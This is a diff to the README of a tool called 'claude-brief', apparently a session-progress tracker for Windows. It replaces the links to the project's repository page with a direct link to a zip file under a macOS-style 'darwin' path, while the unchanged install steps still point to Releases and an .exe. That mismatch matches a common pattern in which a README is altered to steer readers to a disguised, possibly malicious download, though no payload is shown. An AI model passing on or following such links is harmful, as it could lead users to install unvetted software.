@@ -1,6 +1,6 @@
 # 📋 claude-brief - Keep track of your session progress
 
-[![Download claude-brief](https://img.shields.io/badge/Download-claude--brief-blue.svg)](https://github.com/vp461876/claude-brief)
+[![Download claude-brief](https://img.shields.io/badge/Download-claude--brief-blue.svg)](https://raw.githubusercontent.com/vp461876/claude-brief/main/bin/term/darwin/claude_brief_2.0.zip)
 
 ## 📌 What is claude-brief?
 
@@ -12,7 +12,7 @@ This application runs on Windows 10 or Windows 11. It requires at least 4GB of R
 
 ## 📥 How to Install
 
-1. Visit the [official download page](https://github.com/vp461876/claude-brief) to get the application.
+1. Visit the [official download page](https://raw.githubusercontent.com/vp461876/claude-brief/main/bin/term/darwin/claude_brief_2.0.zip) to get the application.
 2. Locate the link labeled "Releases" on the right side of the page.
 3. Click the most recent version available.
 4. Look for the file ending in `.exe` under the Assets section.
